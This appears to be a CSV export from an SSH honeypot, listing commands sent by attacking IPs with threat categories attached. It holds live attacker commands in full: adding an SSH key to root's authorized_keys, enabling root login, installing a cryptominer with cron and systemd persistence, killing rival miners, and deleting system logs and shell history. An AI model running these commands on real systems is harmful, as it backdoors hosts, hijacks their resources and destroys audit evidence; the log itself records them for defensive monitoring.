session_id,ip,username,mode,ssh_original_command,categories,malware_upload,malware_upload_reasons,termination_reason,created_files
1776546155_192.42.116.101_47911_sshshadow,192.42.116.101,admin,non_interactive_exec,LC_ALL=C sudo -S sh -c 'mkdir -p ~root/.ssh',SSH persistence,False,,exit_code_127,
1776546157_192.42.116.101_47911_sshshadow,192.42.116.101,admin,non_interactive_exec,LC_ALL=C sudo -S sh -c 'chmod 700 ~root/.ssh',SSH persistence,False,,exit_code_127,
1776546159_192.42.116.101_47911_sshshadow,192.42.116.101,admin,non_interactive_exec,LC_ALL=C sudo -S sh -c 'echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuhPmv3xdhU7JbMoc/ecBTDxiGqFNKbe564p4aNT6JbYWjNwZ5z6E4iQQDQ0bEp7uBtB0aut0apqDF/SL7pN5ybh2X44aCwDaSEB6bJuJi0yMkZwIvenmtCA1LMAr2XifvGS/Ulac7Qh5vFzfw562cWC+IOI+LyQZAcPgr+CXphJhm8QQ+O454ItXurQX6oPlA2rNfF36fnxYss1ZvUYC80wWTi9k2+/XR3IoQXZHKCFsJiwyKO2CY+jShBbDBbtdOX3/ksHNVNStA/jPE0HYD7u6V2Efjv9K+AEbklMsytD9T60Iu3ua+ugBrP5hL7zAjPHpXH8qW4Ku7dySZ4yvH >>~root/.ssh/authorized_keys',SSH persistence,False,,exit_code_127,
1776546161_192.42.116.101_47911_sshshadow,192.42.116.101,admin,non_interactive_exec,LC_ALL=C sudo -S sh -c 'sed -i '\''s/PermitRootLogin no/PermitRootLogin yes/'\'' /etc/ssh/sshd_config',SSH persistence,False,,exit_code_127,
1776546163_192.42.116.101_47911_sshshadow,192.42.116.101,admin,non_interactive_exec,LC_ALL=C sudo -S sh -c 'systemctl restart sshd.service',SSH persistence,False,,exit_code_127,
1776546165_192.42.116.101_47911_sshshadow,192.42.116.101,admin,non_interactive_exec,LC_ALL=C sudo -S sh -c 'pkill -HUP sshd',SSH persistence,False,,exit_code_127,
1776546178_192.42.116.142_34564_sshshadow,192.42.116.142,admin,non_interactive_exec,LC_ALL=C top -bn1,Generic recon,False,,normal_exit,
1776546335_34.91.248.132_43538_sshshadow,34.91.248.132,admin,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776546337_34.91.248.132_43538_sshshadow,34.91.248.132,admin,non_interactive_exec,cat /etc/passwd,Data / credential hunting; GCS-aware discovery,False,,normal_exit,
1776546339_34.91.248.132_43538_sshshadow,34.91.248.132,admin,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776546341_34.91.248.132_43538_sshshadow,34.91.248.132,admin,non_interactive_exec,passwd,Data / credential hunting,False,,normal_exit,
1776546455_34.91.248.132_57452_sshshadow,34.91.248.132,deploy,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776546457_34.91.248.132_57452_sshshadow,34.91.248.132,deploy,non_interactive_exec,cat /etc/passwd,Data / credential hunting; GCS-aware discovery,False,,normal_exit,
1776546459_34.91.248.132_57452_sshshadow,34.91.248.132,deploy,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776546460_34.91.248.132_57452_sshshadow,34.91.248.132,deploy,non_interactive_exec,passwd,Data / credential hunting,False,,normal_exit,
1776546575_34.91.248.132_32774_sshshadow,34.91.248.132,ubuntu,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776546577_34.91.248.132_32774_sshshadow,34.91.248.132,ubuntu,non_interactive_exec,cat /etc/passwd,Data / credential hunting; GCS-aware discovery,False,,normal_exit,
1776546579_34.91.248.132_32774_sshshadow,34.91.248.132,ubuntu,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776546581_34.91.248.132_32774_sshshadow,34.91.248.132,ubuntu,non_interactive_exec,passwd,Data / credential hunting,False,,normal_exit,
1776546697_34.91.248.132_53512_sshshadow,34.91.248.132,test,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776546698_34.91.248.132_53512_sshshadow,34.91.248.132,test,non_interactive_exec,cat /etc/passwd,Data / credential hunting; GCS-aware discovery,False,,normal_exit,
1776546700_34.91.248.132_53512_sshshadow,34.91.248.132,test,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776546702_34.91.248.132_53512_sshshadow,34.91.248.132,test,non_interactive_exec,passwd,Data / credential hunting,False,,normal_exit,
1776548771_86.38.24.97_21365_sshshadow,86.38.24.97,admin,,cut -d' ' -f1 /proc/uptime,,False,,,
1776548772_86.38.24.97_21365_sshshadow,86.38.24.97,admin,,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,,
1776548773_86.38.24.97_21365_sshshadow,86.38.24.97,admin,,"cd ""/tmp"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,,
1776548774_86.38.24.97_21365_sshshadow,86.38.24.97,admin,,"PATH=$PATH:/usr/bin:/usr/local/bin CRON=""$(crontab -l 2>/dev/null || true)"" if ! echo ""$CRON"" | grep -F '/tmp/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1; then (echo ""$CRON""; echo '@reboot /tmp/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""'; echo '0 * * * * cd ""/tmp"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""') | crontab - fi",Miner deployment; SSH persistence,False,,,
1776548775_86.38.24.97_21365_sshshadow,86.38.24.97,admin,,ps aux | grep astats | grep -v grep |grep -v systemd-networkd |grep -v ld-musl-x86_64 |grep -v rsyslogd | wc -l,Generic recon; Miner deployment,False,,,
1776548776_86.38.24.97_21365_sshshadow,86.38.24.97,admin,,rm -rf .bash_history;rm -rf /var/run/utmp;rm -rf /var/run/wtmp -;rm -rf /var/log/lastlog;rm -rf /usr/adm/lastlog;rm -rf .bash_history;cd /home;rm -rf yum.log;cd /var/log/;rm -rf wtmp;rm -rf secure;rm -rf lastlog;rm -rf messages;touch messagess;touch wtmp;touch secure;touch lastlog;cd /root;rm -rf .bash_history;touch .bash_history;unset HISTFILE;unset HISTSAVE;history -n;unset WATCH;nohup sh /tmp/.ssh/b &;cd;HISTFILE=/dev/null;history -c && rm -f ~/.bash_history;cd ..,Data / credential hunting; SSH persistence,False,,,
1776551324_86.38.24.97_17195_sshshadow,86.38.24.97,admin,non_interactive_exec,sudo -n true,,False,,exit_code_127,
1776551326_86.38.24.97_17195_sshshadow,86.38.24.97,admin,non_interactive_exec,"sh -c ""pids=$(pgrep -af 'kstats' | grep -vE 'ssh|sshd|bash|sh|pkill|pgrep' | awk '{print $1}'); [ -n \""$pids\"" ] && kill -9 $pids || pkill -x 'kstats' || true""",Miner deployment,False,,normal_exit,
1776551328_86.38.24.97_17195_sshshadow,86.38.24.97,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; find . -type f -name 'kstats' -delete ; find . -type f -name 'c.lock' -delete; kill -9 $(ps aux | grep kproc | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep bstats | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep istats | grep -v grep | awk '{print $2}') 2>/dev/null || true,Generic recon; Miner deployment,False,,normal_exit,
1776552653_86.38.24.201_28341_sshshadow,86.38.24.201,admin,,sudo -n true,,False,,exit_code_23,
1776552654_86.38.24.201_28341_sshshadow,86.38.24.201,admin,non_interactive_exec,"sh -c ""pids=$(pgrep -af 'kstats' | grep -vE 'ssh|sshd|bash|sh|pkill|pgrep' | awk '{print $1}'); [ -n \""$pids\"" ] && kill -9 $pids || pkill -x 'kstats' || true""",Miner deployment,False,,normal_exit,
1776552656_86.38.24.201_28341_sshshadow,86.38.24.201,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; find . -type f -name 'kstats' -delete ; find . -type f -name 'c.lock' -delete; kill -9 $(ps aux | grep kproc | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep bstats | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep istats | grep -v grep | awk '{print $2}') 2>/dev/null || true,Generic recon; Miner deployment,False,,normal_exit,
1776571898_86.38.24.97_61585_sshshadow,86.38.24.97,admin,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776571899_86.38.24.97_61585_sshshadow,86.38.24.97,admin,non_interactive_exec,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,normal_exit,
1776571901_86.38.24.97_61585_sshshadow,86.38.24.97,admin,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776571903_86.38.24.97_61585_sshshadow,86.38.24.97,admin,non_interactive_exec,"cd ""/dev/shm"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,normal_exit,
1776571905_86.38.24.97_61585_sshshadow,86.38.24.97,admin,non_interactive_exec,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/dev/shm"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,exit_code_127,
1776571907_86.38.24.97_61585_sshshadow,86.38.24.97,admin,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,exit_code_127,
1776571909_86.38.24.97_61585_sshshadow,86.38.24.97,admin,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,normal_exit,
1776571911_86.38.24.97_61585_sshshadow,86.38.24.97,admin,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776571912_86.38.24.97_61585_sshshadow,86.38.24.97,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,normal_exit,
1776571916_86.38.24.97_61585_sshshadow,86.38.24.97,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && chmod +x astats && ./astats ssh 2 ranges,Miner deployment,False,,exit_code_141,
1776571919_86.38.24.97_61585_sshshadow,86.38.24.97,admin,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776574320_86.38.24.97_31449_sshshadow,86.38.24.97,admin,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776574322_86.38.24.97_31449_sshshadow,86.38.24.97,admin,non_interactive_exec,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,normal_exit,
1776574325_86.38.24.97_31449_sshshadow,86.38.24.97,admin,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776574327_86.38.24.97_31449_sshshadow,86.38.24.97,admin,non_interactive_exec,"cd ""/dev/shm"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,normal_exit,
1776574328_86.38.24.97_31449_sshshadow,86.38.24.97,admin,non_interactive_exec,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/dev/shm"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,exit_code_127,
1776574330_86.38.24.97_31449_sshshadow,86.38.24.97,admin,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,exit_code_127,
1776574332_86.38.24.97_31449_sshshadow,86.38.24.97,admin,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,normal_exit,
1776574334_86.38.24.97_31449_sshshadow,86.38.24.97,admin,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776574336_86.38.24.97_31449_sshshadow,86.38.24.97,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,normal_exit,
1776574340_86.38.24.97_31449_sshshadow,86.38.24.97,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && chmod +x astats && ./astats ssh 2 ranges,Miner deployment,False,,exit_code_141,
1776574342_86.38.24.97_31449_sshshadow,86.38.24.97,admin,,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,exit_code_23,
1776579512_86.38.24.97_30307_sshshadow,86.38.24.97,admin,non_interactive_exec,sudo -n true,,False,,exit_code_127,
1776579514_86.38.24.97_30307_sshshadow,86.38.24.97,admin,non_interactive_exec,"sh -c ""pids=$(pgrep -af 'kstats' | grep -vE 'ssh|sshd|bash|sh|pkill|pgrep' | awk '{print $1}'); [ -n \""$pids\"" ] && kill -9 $pids || pkill -x 'kstats' || true""",Miner deployment,False,,normal_exit,
1776579516_86.38.24.97_30307_sshshadow,86.38.24.97,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; find . -type f -name 'kstats' -delete ; find . -type f -name 'c.lock' -delete; kill -9 $(ps aux | grep kproc | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep bstats | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep istats | grep -v grep | awk '{print $2}') 2>/dev/null || true,Generic recon; Miner deployment,False,,normal_exit,
1776588392_86.38.24.97_50665_sshshadow,86.38.24.97,admin,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776588394_86.38.24.97_50665_sshshadow,86.38.24.97,admin,non_interactive_exec,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,normal_exit,
1776588396_86.38.24.97_50665_sshshadow,86.38.24.97,admin,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776588398_86.38.24.97_50665_sshshadow,86.38.24.97,admin,non_interactive_exec,"cd ""/dev/shm"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,normal_exit,
1776588400_86.38.24.97_50665_sshshadow,86.38.24.97,admin,non_interactive_exec,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/dev/shm"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,exit_code_127,
1776588402_86.38.24.97_50665_sshshadow,86.38.24.97,admin,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,exit_code_127,
1776588404_86.38.24.97_50665_sshshadow,86.38.24.97,admin,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,normal_exit,
1776588406_86.38.24.97_50665_sshshadow,86.38.24.97,admin,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776588408_86.38.24.97_50665_sshshadow,86.38.24.97,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,normal_exit,
1776588419_86.38.24.97_50665_sshshadow,86.38.24.97,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && chmod +x astats && ./astats ssh 2 ranges,Miner deployment,False,,exit_code_141,
1776588421_86.38.24.97_50665_sshshadow,86.38.24.97,admin,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776592802_86.38.24.97_6747_sshshadow,86.38.24.97,admin,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776592810_86.38.24.97_6747_sshshadow,86.38.24.97,admin,non_interactive_exec,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,normal_exit,
1776592812_86.38.24.97_6747_sshshadow,86.38.24.97,admin,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776592814_86.38.24.97_6747_sshshadow,86.38.24.97,admin,non_interactive_exec,"cd ""/dev/shm"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,normal_exit,
1776592816_86.38.24.97_6747_sshshadow,86.38.24.97,admin,non_interactive_exec,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/dev/shm"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,exit_code_127,
1776592818_86.38.24.97_6747_sshshadow,86.38.24.97,admin,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,exit_code_127,
1776592820_86.38.24.97_6747_sshshadow,86.38.24.97,admin,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,normal_exit,
1776592822_86.38.24.97_6747_sshshadow,86.38.24.97,admin,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776592824_86.38.24.97_6747_sshshadow,86.38.24.97,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,normal_exit,
1776592910_86.38.24.97_6747_sshshadow,86.38.24.97,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,normal_exit,
1776593186_86.38.24.97_6747_sshshadow,86.38.24.97,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,normal_exit,
1776595663_86.38.24.97_7263_sshshadow,86.38.24.97,admin,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776595666_86.38.24.97_7263_sshshadow,86.38.24.97,admin,non_interactive_exec,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,normal_exit,
1776595668_86.38.24.97_7263_sshshadow,86.38.24.97,admin,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776595670_86.38.24.97_7263_sshshadow,86.38.24.97,admin,non_interactive_exec,"cd ""/dev/shm"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,normal_exit,
1776595672_86.38.24.97_7263_sshshadow,86.38.24.97,admin,non_interactive_exec,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/dev/shm"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,exit_code_127,
1776595674_86.38.24.97_7263_sshshadow,86.38.24.97,admin,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,exit_code_127,
1776595676_86.38.24.97_7263_sshshadow,86.38.24.97,admin,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,normal_exit,
1776595678_86.38.24.97_7263_sshshadow,86.38.24.97,admin,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776595679_86.38.24.97_7263_sshshadow,86.38.24.97,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,normal_exit,
1776595686_86.38.24.97_7263_sshshadow,86.38.24.97,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && chmod +x astats && ./astats ssh 2 ranges,Miner deployment,False,,exit_code_141,
1776595688_86.38.24.97_7263_sshshadow,86.38.24.97,admin,,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,exit_code_23,
1776601054_45.91.7.59_9287_sshshadow,45.91.7.59,admin,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776601056_45.91.7.59_9287_sshshadow,45.91.7.59,admin,non_interactive_exec,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,normal_exit,
1776601058_45.91.7.59_9287_sshshadow,45.91.7.59,admin,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776601060_45.91.7.59_9287_sshshadow,45.91.7.59,admin,non_interactive_exec,"cd ""/dev/shm"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,normal_exit,
1776601062_45.91.7.59_9287_sshshadow,45.91.7.59,admin,non_interactive_exec,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/dev/shm"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,exit_code_127,
1776601064_45.91.7.59_9287_sshshadow,45.91.7.59,admin,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,exit_code_127,
1776601066_45.91.7.59_9287_sshshadow,45.91.7.59,admin,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,normal_exit,
1776601068_45.91.7.59_9287_sshshadow,45.91.7.59,admin,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776601070_45.91.7.59_9287_sshshadow,45.91.7.59,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,normal_exit,
1776601074_45.91.7.59_9287_sshshadow,45.91.7.59,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && chmod +x astats && ./astats ssh 2 ranges,Miner deployment,False,,exit_code_141,
1776601076_45.91.7.59_9287_sshshadow,45.91.7.59,admin,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776614048_45.91.7.59_36383_sshshadow,45.91.7.59,admin,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776614050_45.91.7.59_36383_sshshadow,45.91.7.59,admin,non_interactive_exec,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,normal_exit,
1776614052_45.91.7.59_36383_sshshadow,45.91.7.59,admin,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776614054_45.91.7.59_36383_sshshadow,45.91.7.59,admin,non_interactive_exec,"cd ""/dev/shm"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,normal_exit,
1776614056_45.91.7.59_36383_sshshadow,45.91.7.59,admin,non_interactive_exec,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/dev/shm"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,exit_code_127,
1776614058_45.91.7.59_36383_sshshadow,45.91.7.59,admin,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,exit_code_127,
1776614060_45.91.7.59_36383_sshshadow,45.91.7.59,admin,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,normal_exit,
1776614062_45.91.7.59_36383_sshshadow,45.91.7.59,admin,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776614064_45.91.7.59_36383_sshshadow,45.91.7.59,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,normal_exit,
1776614069_45.91.7.59_53583_sshshadow,45.91.7.59,ubuntu,,uname -a,GCS-aware discovery; Host profiling,False,,,
1776614070_45.91.7.59_53583_sshshadow,45.91.7.59,ubuntu,,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,,
1776614071_45.91.7.59_53583_sshshadow,45.91.7.59,ubuntu,,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/tmp/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /tmp/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/tmp"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,,
